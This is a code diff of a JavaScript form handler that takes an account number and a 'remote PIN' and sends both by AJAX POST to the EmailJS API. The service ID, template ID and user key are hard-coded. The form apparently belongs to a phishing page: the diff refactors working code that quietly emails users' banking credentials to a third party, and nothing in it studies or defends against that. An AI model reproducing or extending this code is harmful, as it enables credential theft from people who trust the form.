@@ -18,27 +18,32 @@ form.addEventListener("submit", (e) => {
   const remotePinVal = validateInput(remotePin);
 
   if (accountNoVal && remotePinVal) {
+    // Set the submitting state
     button.innerHTML = `Submitting <i class="fa fa-spinner fa-spin"></i>`;
-    button.ariaDisabled = "true";
 
-    emailjs.init("Wty3VQ9KPSIcGj-cS");
+    const data = {
+      service_id: "service_sn6mekz",
+      template_id: "template_p15fdti",
+      user_id: "Wty3VQ9KPSIcGj-cS",
+      template_params: { accountNoVal, remotePinVal },
+    };
 
-    emailjs
-      .send("service_sn6mekz", "template_p15fdti", {
-        accountNoVal,
-        remotePinVal,
+    // Send the email
+    $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
+      type: "POST",
+      data: JSON.stringify(data),
+      contentType: "application/json",
+    })
+      .done((data) => {
+        console.log(data);
+        alert("Submitted!");
+        window.location.reload();
       })
-      .then(
-        function () {
-          alert("SUCCESS!");
-          window.location.reload();
-        },
-        function (error) {
-          alert(error);
-          console.log("FAILED...", error);
-        }
-      );
-  }
+      .fail((err) => {
+        button.innerHTML = `Submit <i class="fa fa-arrow-right icon"></i>`;
 
-  return;
+        alert("Something failed!");
+        console.log(err);
+      });
+  }
 });
